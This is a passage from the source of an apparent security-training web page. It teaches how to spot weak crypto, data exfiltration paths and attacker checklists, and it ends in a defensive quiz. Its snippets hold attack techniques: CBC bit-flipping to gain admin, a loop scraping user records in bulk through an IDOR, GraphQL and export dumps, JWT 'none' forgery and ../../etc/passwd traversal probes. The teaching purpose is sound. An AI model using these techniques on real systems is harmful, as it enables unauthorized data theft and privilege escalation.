# Example of weak "encryption" to spot:
function encrypt(data) {
  return btoa(data);  // Just base64!
}

function encrypt(data, key) {
  return data.split('').map((c, i) => 
    String.fromCharCode(c.charCodeAt(0) ^ key.charCodeAt(i % key.length))
  ).join('');  // Simple XOR
}`,
        warning: "If you see custom crypto, it's almost certainly breakable. Report it as 'use of weak cryptography'.",
      },
      {
        title: "Weak Encryption of Stored Data",
        detailedDescription: `Even when applications use real encryption algorithms, implementation mistakes can make the encryption trivially breakable. These mistakes are surprisingly common.

**The ECB Mode Disaster**: ECB (Electronic Codebook) mode encrypts each block independently. This means identical plaintext blocks produce identical ciphertext blocks. For structured data like database records, this creates recognizable patterns. The famous 'ECB penguin' demonstrates this - an image encrypted with ECB still shows the penguin shape.

**The IV/Nonce Problem**: Block ciphers like AES in CBC mode require an Initialization Vector (IV) to randomize encryption. Without an IV, or with a reused IV, the same plaintext always produces the same ciphertext. Stream ciphers with reused nonces are even worse - XORing two ciphertexts together reveals the XOR of the plaintexts.

**Hardcoded Keys**: If the encryption key is in the source code or configuration, anyone with code access can decrypt everything. Keys should be in secure key management systems, not embedded in applications. Finding a hardcoded key is an immediate critical finding.

**No Authentication**: Encryption without authentication (MAC or AEAD mode like GCM) allows attackers to modify ciphertext in ways that produce meaningful plaintext changes. CBC bit-flipping attacks can change 'admin=false' to 'admin=true' without knowing the key.`,
        beginnerTips: [
          "Encrypt the same value twice - if the ciphertext is identical, there's no random IV (or it's ECB mode)",
          "Look for 16-byte (128-bit) repeating patterns in ciphertext - that's ECB mode",
          "Search code for encryption functions and trace where the key comes from - if it's hardcoded, game over",
          "If you can modify encrypted data and it's still accepted, there's no integrity protection"
        ],
        realWorldExample: "Adobe encrypted 153 million passwords using 3DES-ECB. Because ECB produces identical ciphertexts for identical passwords, security researchers could identify the most common passwords by frequency analysis, without needing to decrypt anything.",
        points: [
          "Same ciphertext for identical inputs = no IV/nonce or ECB mode",
          "ECB mode produces recognizable patterns in structured data",
          "Reused IVs with stream ciphers = XOR of plaintexts recoverable",
          "Hardcoded encryption keys (same key for all users/instances)",
          "Keys derived predictably from known values (user ID, timestamp)",
          "Encryption without authentication (AES-CBC vs AES-GCM)",
        ],
        code: `# ECB mode detection - encrypt same block twice
# If ciphertext has repeating 16-byte blocks, it's ECB

# Compare ciphertexts:
user1_encrypted: aGVsbG8gd29ybGQ=
user2_encrypted: aGVsbG8gd29ybGQ=
# Same ciphertext = same plaintext = deterministic encryption

# Stream cipher with reused IV:
ciphertext1 XOR ciphertext2 = plaintext1 XOR plaintext2
# With known plaintext1, recover plaintext2`,
        table: {
          headers: ["Weakness", "How to Detect", "How to Exploit"],
          rows: [
            ["ECB mode", "Repeating blocks in ciphertext", "Pattern analysis, block swapping"],
            ["No IV", "Same plaintext = same ciphertext", "Precompute common values"],
            ["Weak key", "Key in config/code", "Decrypt everything offline"],
            ["No integrity", "Modify ciphertext, still decrypts", "Bit flipping attacks"],
            ["Predictable IV", "Sequential or timestamp-based", "Decrypt with known IV"],
          ],
        },
      },
      {
        title: "Integrity Without Actual Integrity",
        detailedDescription: `Confidentiality (keeping data secret) is different from integrity (detecting tampering). Many systems encrypt data but never check if it's been modified - a critical oversight.

**The Signature Verification Gap**: Applications generate signatures and HMACs but sometimes never verify them. The verification code exists but is never called, or it catches exceptions and continues anyway. Always test: can you modify signed data and have it accepted?

**JWT Algorithm Vulnerabilities**: JWTs can use different signing algorithms. The 'none' algorithm vulnerability occurs when servers accept unsigned tokens (alg: 'none'). Algorithm confusion attacks trick servers into verifying RS256 signatures using the public key as an HMAC secret.

**License File Attacks**: Software license files are often encrypted but not authenticated. You can't read what the license says, but you might be able to flip bits to change 'licensed=false' to 'licensed=true'. If the only check is 'does this decrypt?', bit-flipping works.

**CBC Bit-Flipping In Practice**: In CBC mode, modifying one byte of ciphertext in block N affects the corresponding byte in the decrypted block N+1. If you know the plaintext structure, you can surgically change specific characters without knowing the key.`,
        beginnerTips: [
          "For JWTs: change the algorithm to 'none' and remove the signature - see if the server accepts it",
          "Try modifying encrypted cookies/tokens slightly - if they're still accepted, there's no integrity check",
          "Look for HMAC or signature generation in code, then search for verification - often it's missing",
          "The bit-flipping formula: new_ciphertext[i] = old_ciphertext[i] XOR old_plaintext[i] XOR desired_plaintext[i]"
        ],
        realWorldExample: "The Flexera license system used AES-CBC without authentication. Researchers demonstrated that bit-flipping ciphertext could change license parameters like expiration date and feature flags, generating valid licenses for any software without knowing the encryption key.",
        points: [
          "'Encrypted' data that's not authenticated (MAC/AEAD)",
          "Signatures that aren't actually verified",
          "License files with encryption but no tamper detection",
          "Config files where you can flip bits to change values",
          "JWT 'none' algorithm or algorithm confusion attacks",
        ],
        code: `# CBC bit-flipping attack
# Modify ciphertext byte to change corresponding plaintext byte
# Useful when you know structure: "admin=false" → "admin=true"

# Position to flip: block_size + (position_in_block)
# XOR with: (original_char XOR desired_char)

import struct
ciphertext = bytearray(encrypted_cookie)
target_pos = 16 + 6  # Assuming "admin=" at position 6 in block 2
ciphertext[target_pos] ^= ord('f') ^ ord('t')  # Change 'f' to 't'`,
        testIdeas: [
          "Can you modify encrypted data and have it still accepted?",
          "Does changing ciphertext produce meaningful plaintext changes?",
          "Are signatures/HMACs actually verified, or just present?",
          "Can you downgrade to 'none' algorithm?",
        ],
      },
      {
        title: "Attacks Enabled by Bad Crypto",
        detailedDescription: `Cryptographic weaknesses aren't just theoretical - they enable concrete attacks on real applications. Understanding the attack chain helps you explain impact in bug reports.

**Data Export Decryption**: Applications often 'encrypt' exported data (reports, backups, user data downloads) with weak algorithms or hardcoded keys. If you can decrypt these exports, you can access any user's exported data - often including PII, financial records, or proprietary business information.

**License Bypass**: Software licensing systems rely on cryptographic protections. Weak encryption, missing integrity checks, or predictable serial number formats can enable license bypass, affecting the vendor's entire revenue stream. This is high-impact even if it's 'just' a business logic issue.

**Privilege Escalation**: If user roles or permissions are stored in encrypted cookies or tokens that can be decrypted or modified, you can escalate to admin. Change 'role=user' to 'role=admin' in a weakly encrypted session token, and you've bypassed all authorization.

**Session Hijacking**: Session tokens generated with weak randomness can be predicted. If you can predict another user's session token, you can hijack their session without stealing cookies or performing MITM attacks.

**Data Forgery**: Weak signing allows forging documents, transactions, or audit logs. If the integrity mechanism is broken, the entire trust model collapses.`,
        beginnerTips: [
          "When you find weak crypto, think about what it protects: data confidentiality, session integrity, licensing, audit logs?",
          "Export your own data, try to decrypt it, then explain that this attack works on ANY user's exports",
          "Quantify impact: 'allows decryption of 10 million user records' or 'enables unlimited license generation'",
          "Weak crypto findings should explain the attack chain, not just 'uses XOR encryption'"
        ],
        realWorldExample: "A researcher found that an e-commerce platform encrypted session tokens with a static XOR key. By decrypting their own token, they learned the structure, and could forge tokens for any user including admins. This enabled complete account takeover of any account on the platform.",
        points: [
          "Decrypt exported data to access sensitive information",
          "Forge license files to unlock premium features",
          "Modify encrypted configuration to escalate privileges",
          "Bypass paywalls or usage limits via decrypted state",
          "Access other users' data by predicting/deriving their keys",
          "Recover passwords from poorly encrypted storage",
        ],
        code: `# Example: Decrypting 'encrypted' config with hardcoded key
from Crypto.Cipher import AES
import base64

# Found in decompiled code:
KEY = b'SuperSecretKey16'  # Hardcoded!

encrypted = base64.b64decode(config_value)
cipher = AES.new(KEY, AES.MODE_ECB)  # ECB mode!
decrypted = cipher.decrypt(encrypted)
print(decrypted)`,
        warning: "The goal isn't to break AES - it's to find where crypto is misused, making 'secure' features trivially bypassable.",
      },
    ],
  },
  {
    id: "data-exfil",
    title: "7. Data Exfiltration & Impact",
    icon: <OutputIcon />,
    color: "#dc2626",
    subsections: [
      {
        title: "From Small Leak to Big Breach",
        points: [
          "One exposed config file → database credentials → full DB dump",
          "Leaked API key → access to cloud storage → customer PII",
          "Debug endpoint → session tokens → account takeover at scale",
          "Backup file → source code → more vulnerabilities → RCE",
          "SSRF to metadata → cloud credentials → lateral movement",
          "Single IDOR → enumeration script → all users' data",
        ],
        tip: "Always trace the 'pivot potential' - what can you access with what you found?",
      },
      {
        title: "Exfiltration Paths",
        points: [
          "Legitimate export features abused for bulk extraction",
          "API pagination bypassed or exhausted",
          "Report generators that don't limit data scope",
          "Async job systems that process large datasets",
          "SSRF chained to hit internal storage directly",
          "GraphQL queries requesting entire datasets",
          "File download IDOR iterated across all IDs",
          "Search with no rate limiting",
        ],
        code: `# Bulk IDOR extraction
for id in range(1, 100000):
    response = requests.get(f"https://target.com/api/users/{id}/data",
                           headers={"Authorization": f"Bearer {token}"})
    if response.status_code == 200:
        save_to_file(response.json())

# GraphQL data dump (if no depth limits)
query {
  users {
    id, email, password_hash, ssn
    orders { id, total, items { name, price } }
    messages { content, recipient { email } }
  }
}

# Export feature abuse
POST /api/export
{"format": "csv", "filters": {}, "limit": 999999999}`,
      },
      {
        title: "Chaining Vulnerabilities for Data Access",
        table: {
          headers: ["Start With", "Chain To", "End Result"],
          rows: [
            ["SSRF", "Cloud metadata", "Temporary credentials"],
            ["LFI", "Config file", "Database credentials"],
            ["SQLi", "File read", "Source code / configs"],
            ["XSS", "Admin session", "Full admin access"],
            ["IDOR", "User enumeration", "Mass data extraction"],
            ["Debug endpoint", "Memory dump", "Secrets in memory"],
            ["Path traversal", "Backup file", "Database dump"],
          ],
        },
      },
      {
        title: "Framing Impact for Reports",
        points: [
          "Quantify the volume: '50,000 user records', not 'some data'",
          "Specify sensitivity: 'Including SSN, DOB, and passwords' vs 'PII'",
          "Show pivot potential: 'These credentials allow RDS access'",
          "Reference regulations: GDPR, HIPAA, PCI-DSS, SOX implications",
          "Calculate business impact: breach notification costs, fines, reputation",
          "Demonstrate ease of exploitation: 'Single authenticated request'",
        ],
        code: `# Good impact statement:
"An authenticated attacker can extract all 847,000 customer records 
including: full names, email addresses, hashed passwords (MD5), 
home addresses, phone numbers, and last 4 digits of credit cards.

The API has no rate limiting, allowing full extraction in ~2 hours.
This constitutes a reportable breach under GDPR with potential fines 
up to 4% of annual revenue."

# vs weak:
"User data can be accessed."`,
      },
    ],
  },
  {
    id: "checklist",
    title: "8. Attacker Checklist",
    icon: <ChecklistIcon />,
    color: "#0ea5e9",
    subsections: [
      {
        title: "File Upload Checklist",
        testIdeas: [
          "Where can I upload files? (Profile pics, documents, imports, support tickets)",
          "What happens if I change Content-Type vs extension?",
          "Can I use double extensions, null bytes, or case tricks?",
          "Does path traversal work in the filename?",
          "Do polyglot files bypass content inspection?",
          "Are uploaded files accessible directly? Executable?",
          "What file processors run on uploads? (ImageMagick, LibreOffice, etc.)",
          "Can I overwrite existing files like .htaccess or config?",
        ],
      },
      {
        title: "File Download Checklist",
        testIdeas: [
          "Where are download/export endpoints? What parameters do they take?",
          "Does path traversal work? (../../etc/passwd and encoded variants)",
          "Can I guess or enumerate file IDs?",
          "Do error messages leak file paths or existence?",
          "Can I access other users' files via IDOR?",
          "Are there backup/export features I can abuse for bulk extraction?",
        ],
      },
      {
        title: "Data Storage Checklist",
        testIdeas: [
          "What databases, caches, and storage systems are in use?",
          "Are there public S3 buckets, Azure blobs, or Firebase databases?",
          "Do error messages reveal queries, paths, or structure?",
          "Are there 'export all' or 'debug' features exposing data?",
          "Is GraphQL introspection enabled? What's the full schema?",
          "Is there sensitive data in browser localStorage/sessionStorage?",
        ],
      },
      {
        title: "Logs, Backups & Temp Files Checklist",
        testIdeas: [
          "Are /logs, /debug, /status, /health, /metrics accessible?",
          "Can I find .bak, .old, .zip, .sql, .swp files in web root?",
          "Is .git or .svn directory exposed?",
          "Are temp upload or export directories accessible?",
          "Do cached reports or previews contain sensitive data?",
          "What does Wayback Machine show for this domain?",
        ],
      },
      {
        title: "Secrets Hunting Checklist",
        testIdeas: [
          "What's in .env, config files, and CI/CD configs?",
          "Does git history contain deleted secrets?",
          "Are there API keys in JavaScript bundles or source maps?",
          "Can I extract secrets from mobile apps (APK/IPA)?",
          "Are Prometheus, Grafana, Jenkins, or similar dashboards open?",
          "Can SSRF reach cloud metadata endpoints?",
          "Are there hardcoded test/dev credentials that work in prod?",
        ],
      },
      {
        title: "Crypto Abuse Checklist",
        testIdeas: [
          "Is 'encryption' actually just encoding (base64, hex)?",
          "Does same plaintext produce same ciphertext? (No IV/ECB mode)",
          "Are encryption keys hardcoded in source or config?",
          "Can I modify encrypted data and have it still accepted? (No integrity)",
          "Are there license files, configs, or cookies I can decrypt/forge?",
          "Can I bypass paywalls or limits by manipulating encrypted state?",
        ],
      },
      {
        title: "Data Exfiltration Checklist",
        testIdeas: [
          "What's the maximum data I can extract with my current access?",
          "Are there export features without proper pagination/limits?",
          "Can I chain bugs (SSRF → metadata → cloud creds)?",
          "What's the sensitivity of accessible data? (PII, financial, health)",
          "What regulations apply? (GDPR, HIPAA, PCI-DSS)",
          "How would I frame the impact in a report? (Volume, sensitivity, pivot)",
        ],
      },
    ],
  },
];

const QUIZ_QUESTION_COUNT = 10;
const QUIZ_ACCENT_COLOR = "#ef4444";
const quizQuestions: QuizQuestion[] = [
  {
    id: 1,
    topic: "Fundamentals",
    question: "Data and secrets security focuses on:",
    options: [
      "Protecting sensitive data and credentials across their lifecycle",
      "Only encrypting hard drives",
      "Only scanning for malware",
      "Only managing passwords",
    ],
    correctAnswer: 0,
    explanation: "The goal is to protect data and secrets wherever they are stored, processed, or transmitted.",
  },
  {
    id: 2,
    topic: "Fundamentals",
    question: "PII stands for:",
    options: ["Personally Identifiable Information", "Public Internet Identifier", "Private Internal Index", "Primary Identity Indicator"],
    correctAnswer: 0,
    explanation: "PII includes data that can identify an individual.",
  },
  {
    id: 3,
    topic: "Fundamentals",
    question: "Least privilege means:",
    options: [
      "Users get only the access they need",
      "Everyone is an admin",
      "Permissions never change",
      "Only the security team has access",
    ],
    correctAnswer: 0,
    explanation: "Limiting access reduces the blast radius of compromise.",
  },
  {
    id: 4,
    topic: "Fundamentals",
    question: "Data minimization means:",
    options: [
      "Collecting and storing only what is necessary",
      "Keeping all data forever",
      "Encrypting every file",
      "Allowing all uploads",
    ],
    correctAnswer: 0,
    explanation: "Minimization reduces exposure and compliance risk.",
  },
  {
    id: 5,
    topic: "Fundamentals",
    question: "Exfiltration refers to:",
    options: [
      "Unauthorized transfer of data out of an environment",
      "Applying system updates",
      "Encrypting backups",
      "Creating user accounts",
    ],
    correctAnswer: 0,
    explanation: "Exfiltration is the unauthorized movement of data to an attacker.",
  },
  {
    id: 6,
    topic: "Fundamentals",
    question: "The safest place to store secrets is:",
    options: [
      "A dedicated secrets manager",
      "Client-side code",
      "A shared document",
      "Source control comments",
    ],
    correctAnswer: 0,
    explanation: "Secrets managers provide controlled access and auditing.",
  },
  {
    id: 7,
    topic: "Fundamentals",
    question: "Hardcoding secrets in code is risky because:",
    options: [
      "They can be exposed through repos or client bundles",
      "They are encrypted automatically",
      "They improve performance",
      "They are always private",
    ],
    correctAnswer: 0,
    explanation: "Hardcoded secrets are easy to leak and hard to rotate.",
  },
  {
    id: 8,
    topic: "Fundamentals",
    question: "Why should secrets be masked in logs?",
    options: [
      "Logs are often broadly accessible and long-lived",
      "It makes logs faster",
      "It disables monitoring",
      "It removes audit trails",
    ],
    correctAnswer: 0,
    explanation: "Logs can be accessed by many systems and people.",
  },
  {
    id: 9,
    topic: "Fundamentals",
    question: "Defense in depth for data protection includes:",
    options: [
      "Access control, encryption, and monitoring",
      "Only backups",
      "Only antivirus",
      "Only strong passwords",
    ],
    correctAnswer: 0,
    explanation: "Layered controls reduce single points of failure.",
  },
  {
    id: 10,
    topic: "Fundamentals",
    question: "Credential rotation helps by:",
    options: [
      "Limiting the impact of leaked secrets",
      "Disabling encryption",
      "Reducing audit logs",
      "Making secrets permanent",
    ],
    correctAnswer: 0,
    explanation: "Rotation shortens the window of exposure.",
  },
  {
    id: 11,
    topic: "Classification",
    question: "Data classification labels are used to:",
    options: [
      "Define handling, storage, and access requirements",
      "Increase storage costs",
      "Hide data from audits",
      "Avoid encryption",
    ],
    correctAnswer: 0,
    explanation: "Classification guides how data must be protected.",
  },
  {
    id: 12,
    topic: "Classification",
    question: "Confidential data should be:",
    options: [
      "Encrypted at rest and in transit",
      "Stored in public buckets",
      "Shared without restrictions",
      "Kept in client-side storage",
    ],
    correctAnswer: 0,
    explanation: "Encryption protects sensitive data in storage and transit.",
  },
  {
    id: 13,
    topic: "Classification",
    question: "A data owner is responsible for:",
    options: [
      "Defining classification and access requirements",
      "Running antivirus scans",
      "Rotating logs",
      "Updating firmware",
    ],
    correctAnswer: 0,
    explanation: "Owners define how data should be handled and accessed.",
  },
  {
    id: 14,
    topic: "Classification",
    question: "Retention policies ensure:",
    options: [
      "Data is kept only as long as needed",
      "All data is stored forever",
      "Backups are never deleted",
      "Logs are disabled",
    ],
    correctAnswer: 0,
    explanation: "Retention reduces exposure and supports compliance.",
  },
  {
    id: 15,
    topic: "Classification",
    question: "Pseudonymization means:",
    options: [
      "Replacing identifiers while keeping a reversible mapping",
      "Removing all identifiers permanently",
      "Encrypting data with a public key",
      "Deleting logs",
    ],
    correctAnswer: 0,
    explanation: "Pseudonymization can be reversed with a mapping.",
  },
  {
    id: 16,
    topic: "Classification",
    question: "Tokenization is:",
    options: [
      "Replacing sensitive values with non-sensitive tokens",
      "Encrypting with a static key",
      "Compressing logs",
      "Duplicating data",
    ],
    correctAnswer: 0,
    explanation: "Tokens reduce exposure while preserving structure.",
  },
  {
    id: 17,
    topic: "Classification",
    question: "Redaction means:",
    options: [
      "Masking or removing sensitive portions of data",
      "Encrypting files",
      "Exporting full records",
      "Increasing log verbosity",
    ],
    correctAnswer: 0,
    explanation: "Redaction hides sensitive data while keeping context.",
  },
  {
    id: 18,
    topic: "Classification",
    question: "Data residency refers to:",
    options: [
      "Where data is stored and processed geographically",
      "How data is encrypted",
      "Who owns the data",
      "How data is backed up",
    ],
    correctAnswer: 0,
    explanation: "Residency affects compliance and legal requirements.",
  },
  {
    id: 19,
    topic: "Classification",
    question: "Need-to-know access means:",
    options: [
      "Only authorized users can access data for their role",
      "All employees can access all data",
      "Only vendors can access data",
      "Data is stored in public folders",
    ],
    correctAnswer: 0,
    explanation: "Access should be limited to what is required for the job.",
  },
  {
    id: 20,
    topic: "Classification",
    question: "Non-production environments should use:",
    options: [
      "Masked or synthetic data",
      "Full customer datasets",
      "Public buckets only",
      "No access controls",
    ],
    correctAnswer: 0,
    explanation: "Using masked data reduces exposure during testing.",
  },
  {
    id: 21,
    topic: "File Uploads",
    question: "A common file upload risk is:",
    options: [
      "Uploading executable or script files",
      "Using large monitors",
      "Updating packages",
      "Logging in with MFA",
    ],
    correctAnswer: 0,
    explanation: "Executable uploads can lead to code execution.",
  },
  {
    id: 22,
    topic: "File Uploads",
    question: "Validating the Content-Type header alone is unsafe because:",
    options: [
      "It can be spoofed by an attacker",
      "It is encrypted",
      "It only works on Linux",
      "It increases bandwidth",
    ],
    correctAnswer: 0,
    explanation: "Attackers can send any Content-Type header.",
  },
  {
    id: 23,
    topic: "File Uploads",
    question: "A safe upload practice is to:",
    options: [
      "Store uploads outside the web root",
      "Execute uploads directly",
      "Disable validation",
      "Use predictable filenames",
    ],
    correctAnswer: 0,
    explanation: "Keeping uploads outside web roots reduces execution risk.",
  },
  {
    id: 24,
    topic: "File Uploads",
    question: "Randomizing upload filenames helps prevent:",
    options: [
      "Guessing and overwriting existing files",
      "Encryption",
      "Database indexing",
      "SIEM logging",
    ],
    correctAnswer: 0,
    explanation: "Random names reduce enumeration and overwrite risks.",
  },
  {
    id: 25,
    topic: "File Uploads",
    question: "Scanning uploads with AV is used to:",
    options: [
      "Detect known malicious files",
      "Replace server-side validation",
      "Block all PDFs",
      "Disable monitoring",
    ],
    correctAnswer: 0,
    explanation: "AV scanning is one layer and should not replace validation.",
  },
  {
    id: 26,
    topic: "File Uploads",
    question: "Zip slip vulnerabilities allow attackers to:",
    options: [
      "Write files outside the intended extraction path",
      "Encrypt backups",
      "Bypass MFA",
      "Reset passwords",
    ],
    correctAnswer: 0,
    explanation: "Path traversal in archives can write to arbitrary locations.",
  },
  {
    id: 27,
    topic: "File Uploads",
    question: "CSV injection is a risk when:",
    options: [
      "Spreadsheet formulas execute from untrusted fields",
      "Logs are encrypted",
      "Files are compressed",
      "Headers are missing",
    ],
    correctAnswer: 0,
    explanation: "Spreadsheet formulas can execute commands or exfiltrate data.",
  },
  {
    id: 28,
    topic: "File Uploads",
    question: "File size limits help mitigate:",
    options: [
      "Resource exhaustion and denial of service",
      "MFA bypass",
      "SQL injection",
      "DNS tunneling",
    ],
    correctAnswer: 0,
    explanation: "Large files can exhaust storage or processing capacity.",
  },
  {
    id: 29,
    topic: "File Uploads",
    question: "Path traversal in downloads occurs when:",
    options: [
      "User input is used to build file paths without validation",
      "Files are encrypted",
      "Backups are rotated",
      "Users reset passwords",
    ],
    correctAnswer: 0,
    explanation: "Unvalidated paths can allow access to arbitrary files.",
  },
  {
    id: 30,
    topic: "File Uploads",
    question: "Presigned URLs should:",
    options: [
      "Expire after a short time",
      "Last indefinitely",
      "Be shared publicly",
      "Bypass access controls",
    ],
    correctAnswer: 0,
    explanation: "Short expiry limits unauthorized access.",
  },
  {
    id: 31,
    topic: "Storage",
    question: "Secrets in client-side code are risky because:",
    options: [
      "They are visible to any user who can inspect the client",
      "They are automatically rotated",
      "They increase performance",
      "They are always encrypted",
    ],
    correctAnswer: 0,
    explanation: "Client-side code can be inspected and secrets extracted.",
  },
  {
    id: 32,
    topic: "Storage",
    question: "A safe storage approach is to:",
    options: [
      "Separate public and private data buckets",
      "Store everything in a public bucket",
      "Disable access controls",
      "Allow public listing by default",
    ],
    correctAnswer: 0,
    explanation: "Separation reduces accidental exposure.",
  },
  {
    id: 33,
    topic: "File Uploads",
    question: "Best practice for file types is to:",
    options: [
      "Allowlist extensions and validate content",
      "Allow any extension",
      "Trust client-side checks only",
      "Disable validation",
    ],
    correctAnswer: 0,
    explanation: "Allowlists and content checks reduce risk.",
  },
  {
    id: 34,
    topic: "File Uploads",
    question: "Server-side validation is required because:",
    options: [
      "Client-side checks can be bypassed",
      "It slows uploads",
      "It breaks encryption",
      "It disables logging",
    ],
    correctAnswer: 0,
    explanation: "Attackers can bypass client-side checks easily.",
  },
  {
    id: 35,
    topic: "Logging",
    question: "Logging full secrets is risky because:",
    options: [
      "Logs are widely accessible and retained",
      "It improves troubleshooting",
      "It reduces storage",
      "It guarantees security",
    ],
    correctAnswer: 0,
    explanation: "Logs often have broad access and long retention.",
  },
  {
    id: 36,
    topic: "Storage",
    question: "Uploads should be stored with:",
    options: [
      "Restricted permissions and no public access",
      "Public read access by default",
      "No access controls",
      "Shared global credentials",
    ],
    correctAnswer: 0,
    explanation: "Restrictive permissions prevent accidental exposure.",
  },
  {
    id: 37,
    topic: "Secrets",
    question: "A secrets manager provides:",
    options: [
      "Centralized storage, access control, and auditing",
      "Public sharing links",
      "Unlimited access for all users",
      "Client-side storage",
    ],
    correctAnswer: 0,
    explanation: "Secrets managers control access and track usage.",
  },
  {
    id: 38,
    topic: "Secrets",
    question: "Secrets should never be stored in:",
    options: [
      "Source control repositories",
      "A secrets manager",
      "Environment injection at runtime",
      "KMS encrypted stores",
    ],
    correctAnswer: 0,
    explanation: "Source control is a common leak vector.",
  },
  {
    id: 39,
    topic: "Secrets",
    question: "API keys should be:",
    options: [
      "Scoped to only the required permissions",
      "Full admin access by default",
      "Shared across teams",
      "Embedded in client apps",
    ],
    correctAnswer: 0,
    explanation: "Scoped keys limit damage if exposed.",
  },
  {
    id: 40,
    topic: "Secrets",
    question: "Short-lived tokens reduce risk because:",
    options: [
      "Stolen tokens expire quickly",
      "They never expire",
      "They disable encryption",
      "They remove audits",
    ],
    correctAnswer: 0,
    explanation: "Short lifetimes limit exposure if tokens leak.",
  },
  {
    id: 41,
    topic: "Secrets",
    question: "After a secret is exposed, you should:",
    options: [
      "Rotate it immediately and invalidate old tokens",
      "Ignore it",
      "Share it with vendors",
      "Disable logging",
    ],
    correctAnswer: 0,
    explanation: "Rotation and invalidation reduce continued abuse.",
  },
  {
    id: 42,
    topic: "Secrets",
    question: "KMS or HSM usage helps by:",
    options: [
      "Protecting and auditing cryptographic keys",
      "Disabling encryption",
      "Storing passwords in plain text",
      "Reducing access controls",
    ],
    correctAnswer: 0,
    explanation: "KMS/HSM provide secure key storage and controls.",
  },
  {
    id: 43,
    topic: "Secrets",
    question: "Separating key management from data access:",
    options: [
      "Reduces the chance of single point compromise",
      "Increases exposure",
      "Removes auditing",
      "Disables encryption",
    ],
    correctAnswer: 0,
    explanation: "Separation of duties reduces compromise impact.",
  },
  {
    id: 44,
    topic: "Secrets",
    question: "Secret scanning in CI helps:",
    options: [
      "Detect accidental secret commits early",
      "Hide secrets",
      "Disable alerts",
      "Increase log noise",
    ],
    correctAnswer: 0,
    explanation: "Scanning prevents secrets from entering repositories.",
  },
  {
    id: 45,
    topic: "Secrets",
    question: "Sharing secrets in tickets or chat is risky because:",
    options: [
      "They may be stored and accessible long term",
      "It improves collaboration",
      "It increases encryption",
      "It reduces audit needs",
    ],
    correctAnswer: 0,
    explanation: "Tickets and chats are often retained and widely accessible.",
  },
  {
    id: 46,
    topic: "Secrets",
    question: "Per-service accounts are preferred because:",
    options: [
      "They improve accountability and limit blast radius",
      "They are faster",
      "They are always public",
      "They prevent auditing",
    ],
    correctAnswer: 0,
    explanation: "Separate accounts reduce shared exposure.",
  },
  {
    id: 47,
    topic: "Access Control",
    question: "RBAC stands for:",
    options: [
      "Role-Based Access Control",
      "Rule-Based Access Cache",
      "Remote Backup Access Control",
      "Rapid Breach Access Control",
    ],
    correctAnswer: 0,
    explanation: "RBAC assigns permissions based on roles.",
  },
  {
    id: 48,
    topic: "Access Control",
    question: "ABAC stands for:",
    options: [
      "Attribute-Based Access Control",
      "Application Backup Access Control",
      "Automated Breach Alert Control",
      "Admin Blocklist Access Control",
    ],
    correctAnswer: 0,
    explanation: "ABAC uses attributes like department or region.",
  },
  {
    id: 49,
    topic: "Access Control",
    question: "Row-level security is used to:",
    options: [
      "Restrict data access to specific rows per user",
      "Encrypt entire disks",
      "Handle uploads",
      "Rotate logs",
    ],
    correctAnswer: 0,
    explanation: "Row-level security enforces per-record access controls.",
  },
  {
    id: 50,
    topic: "Access Control",
    question: "Multi-tenant systems should always enforce:",
    options: [
      "Tenant scoping on every query",
      "Public read access",
      "Shared admin accounts",
      "No authentication",
    ],
    correctAnswer: 0,
    explanation: "Tenant scoping prevents cross-tenant data exposure.",
  },
  {
    id: 51,
    topic: "Access Control",
    question: "IDOR vulnerabilities allow:",
    options: [
      "Access to another user's data by changing an ID",
      "Faster queries",
      "Automatic encryption",
      "Improved backups",
    ],
    correctAnswer: 0,
    explanation: "IDOR occurs when access checks are missing or weak.",
  },
  {
    id: 52,
    topic: "Access Control",
    question: "Default deny means:",
    options: [
      "Access is blocked unless explicitly allowed",
      "All access is allowed",
      "Only admins can log in",
      "Logs are disabled",
    ],
    correctAnswer: 0,
    explanation: "Default deny reduces unintended access.",
  },
  {
    id: 53,
    topic: "Access Control",
    question: "Admin access should require:",
    options: [
      "Strong authentication such as MFA",
      "No authentication",
      "Shared passwords",
      "Public links",
    ],
    correctAnswer: 0,
    explanation: "MFA reduces account compromise risk.",
  },
  {
    id: 54,
    topic: "Access Control",
    question: "Access logs should record:",
    options: [
      "Who accessed data and when",
      "Only file sizes",
      "Only hostnames",
      "Only error codes",
    ],
    correctAnswer: 0,
    explanation: "Audit trails are critical for investigations.",
  },
  {
    id: 55,
    topic: "Access Control",
    question: "Service accounts should have:",
    options: [
      "Only the permissions required for their job",
      "Full admin access",
      "No logging",
      "Public credentials",
    ],
    correctAnswer: 0,
    explanation: "Minimize privileges to reduce impact of compromise.",
  },
  {
    id: 56,
    topic: "Access Control",
    question: "Public bucket listing should be:",
    options: [
      "Disabled unless explicitly required",
      "Enabled by default",
      "Required for backups",
      "Used for secrets",
    ],
    correctAnswer: 0,
    explanation: "Listing can expose sensitive files unintentionally.",
  },
  {
    id: 57,
    topic: "Backups",
    question: "Backups should be:",
    options: [
      "Encrypted and access controlled",
      "Publicly accessible",
      "Stored without testing",
      "Ignored",
    ],
    correctAnswer: 0,
    explanation: "Backups contain sensitive data and must be protected.",
  },
  {
    id: 58,
    topic: "Backups",
    question: "Restore testing is important because:",
    options: [
      "Backups can be corrupted or incomplete",
      "It reduces encryption",
      "It disables logging",
      "It replaces access control",
    ],
    correctAnswer: 0,
    explanation: "Untested backups may fail during incidents.",
  },
  {
    id: 59,
    topic: "Backups",
    question: "Bucket versioning helps by:",
    options: [
      "Allowing recovery from accidental deletions",
      "Disabling encryption",
      "Removing logs",
      "Speeding up uploads only",
    ],
    correctAnswer: 0,
    explanation: "Versioning preserves previous file states.",
  },
  {
    id: 60,
    topic: "Backups",
    question: "Lifecycle policies are used to:",
    options: [
      "Automatically expire or archive old data",
      "Disable access control",
      "Create user accounts",
      "Bypass logging",
    ],
    correctAnswer: 0,
    explanation: "Lifecycle rules manage retention and cost.",
  },
  {
    id: 61,
    topic: "Detection",
    question: "DLP tools are used to:",
    options: [
      "Detect and prevent sensitive data leakage",
      "Run backups",
      "Rotate keys",
      "Encrypt passwords only",
    ],
    correctAnswer: 0,
    explanation: "DLP monitors and blocks data loss channels.",
  },
  {
    id: 62,
    topic: "Detection",
    question: "Monitoring large downloads helps detect:",
    options: [
      "Potential data exfiltration",
      "Disk errors",
      "Printer outages",
      "UI bugs",
    ],
    correctAnswer: 0,
    explanation: "Large downloads can indicate data theft.",
  },
  {
    id: 63,
    topic: "Detection",
    question: "Alerting on unusual query volume helps identify:",
    options: [
      "Automated scraping or data dumping",
      "Normal browsing",
      "User onboarding",
      "Patch deployment",
    ],
    correctAnswer: 0,
    explanation: "Spikes can indicate automated exfiltration.",
  },
  {
    id: 64,
